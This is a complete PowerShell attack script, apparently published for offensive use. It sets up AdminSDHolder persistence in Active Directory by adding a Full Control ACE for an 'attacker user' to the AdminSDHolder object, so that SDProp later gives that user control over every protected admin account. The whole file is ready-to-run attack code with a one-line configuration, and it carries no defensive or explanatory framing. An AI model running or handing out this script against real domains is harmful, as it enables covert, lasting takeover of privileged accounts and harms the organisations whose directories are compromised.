<#
.SYNOPSIS
    This script implements the AdminSDHolder persistence technique using native PowerShell and .NET.
    It adds a Full Control ACE for a specified attacker user on the AdminSDHolder object in Active Directory.

.DESCRIPTION
    The script performs the following steps:
    1. Identifies the current Active Directory domain's Distinguished Name.
    2. Locates the AdminSDHolder object.
    3. Finds the Distinguished Name (DN) of the specified attacker user.
    4. Retrieves the current Discretionary Access Control List (DACL) of the AdminSDHolder object.
    5. Constructs a new Access Control Entry (ACE) granting Full Control to the attacker user.
    6. Adds the new ACE to the DACL and applies the changes to the AdminSDHolder object.

.GitHub: APTKatana
#>

# ============================================================================
#                               USER CONFIGURATION
# ============================================================================

# Line 11: Set the username of the account you want to grant Full Control permissions.
# This user will gain administrative control over all protected AD accounts after SDProp runs.
$AttackerUserName = "Your Target UserName" # <--- ONLY EDIT THIS LINE: Replace "AttackerUser" with your target username (e.g., "Alex")

# ============================================================================
#                            SCRIPT LOGIC - DO NOT EDIT BELOW THIS LINE
# ============================================================================

Write-Host "`n[+] Starting AdminSDHolder Persistence Script..."
Write-Host "---------------------------------------------------`n"

# --- Step 1: Identify Current Domain's Distinguished Name (DN) ---
Write-Host "[*] Identifying current Active Directory domain..."
try {
    $Context = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $DomainDN = $Context.GetDirectoryEntry().distinguishedName
    Write-Host "[+] Domain DN:   $DomainDN"
} catch {
    Write-Error "[-] Failed to identify domain. Ensure the machine is domain-joined and you have network connectivity."
    exit 1
}

# --- Step 2: Identify AdminSDHolder Object DN ---
Write-Host "`n[*] Locating AdminSDHolder object..."
$AdminSDHolderPath = "LDAP://CN=AdminSDHolder,CN=System,$DomainDN"
try {
    $AdminSDHolderObject = [ADSI]$AdminSDHolderPath
    Write-Host "[+] AdminSDHolder object found at: $AdminSDHolderPath"
} catch {
    Write-Error "[-] Error accessing AdminSDHolder object. Check path or permissions. Error: $($_.Exception.Message)"
    exit 1
}

# --- Step 3: Find Attacker User's Distinguished Name (DN) ---
Write-Host "`n[*] Finding Distinguished Name for Attacker User: '$AttackerUserName'..." 
try {
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher
    $Searcher.Filter = "(sAMAccountName=$AttackerUserName)"
    $UserResult = $Searcher.FindOne()
    if ($UserResult -ne $null) {
        $AttackerUserDN = $UserResult.Properties.distinguishedname
        Write-Host "[+] Attacker User DN found: $AttackerUserDN"
    } else {
        Write-Error "[-] Attacker user '$AttackerUserName' not found. Please ensure the user exists in AD or check for typos."
        exit 1
    }
} catch {
    Write-Error "[-] Failed to find attacker user DN. Error: $($_.Exception.Message)"
    exit 1
}
# --- Step 4: Retrieve AdminSDHolder's Current DACL ---
Write-Host "`n[*] Retrieving current Security Descriptor of AdminSDHolder..."
try {
    $SecurityDescriptor = $AdminSDHolderObject.psbase.ObjectSecurity
    Write-Host "[+] Current Security Descriptor retrieved successfully."

    # Optional: Display current ACEs (for verification/debugging)
    # Write-Host "Current ACEs on AdminSDHolder (for reference):"
    # foreach ($ace in $SecurityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
    #     Write-Host "  Identity: $($ace.IdentityReference.Value) | Access: $($ace.AccessControlType) | Rights: $($ace.ActiveDirectoryRights)"
    # }
} catch {
    Write-Error "[-] Failed to retrieve AdminSDHolder's DACL. Error: $($_.Exception.Message)"
    exit 1
}

# --- Step 5: Construct and Add New ACE to DACL ---
Write-Host "`n[*] Constructing new ACE for '$AttackerUserName' with GenericAll rights..."
try {
    # Get SID of the Attacker User
    $AttackerUserSID = (New-Object System.Security.Principal.NTAccount($AttackerUserName)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    Write-Host "[+] Attacker User SID: $AttackerUserSID"

    # Create a new Access Rule (ACE)
    $NewAce = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $AttackerUserSID,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll, # Grants Full Control for AD objects
        [System.Security.AccessControl.AccessControlType]::Allow,
        [System.DirectoryServices.ActiveDirectorySecurityInheritanceType]::None # Apply only to AdminSDHolder object
    )
    Write-Host "[+] New ACE created."

    # Add the new ACE to the Security Descriptor's DACL
    $SecurityDescriptor.AddAccessRule($NewAce)
    Write-Host "[+] New ACE added to Security Descriptor."

    # Apply the modified Security Descriptor back to AdminSDHolder object
    $AdminSDHolderObject.psbase.ObjectSecurity = $SecurityDescriptor
    $AdminSDHolderObject.SetInfo() # Commit the changes to Active Directory
    Write-Host "[+] Successfully applied new Security Descriptor to AdminSDHolder!"
    Write-Host "`n[!!!] ADMINSDHolder persistence established for '$AttackerUserName'.`n"
    Write-Host "      Please wait for SDProp to run (typically within 60-120 minutes) "
    Write-Host "      for the changes to propagate to all protected accounts.`n"

} catch {
    Write-Error "[-] Failed to add/apply ACE to AdminSDHolder. Error: $($_.Exception.Message)"
    Write-Host "    Possible reasons: Lack of sufficient permissions, incorrect user, or AD schema issues."
    exit 1
}

Write-Host "`n[+] Script Finished."
# ============================================================================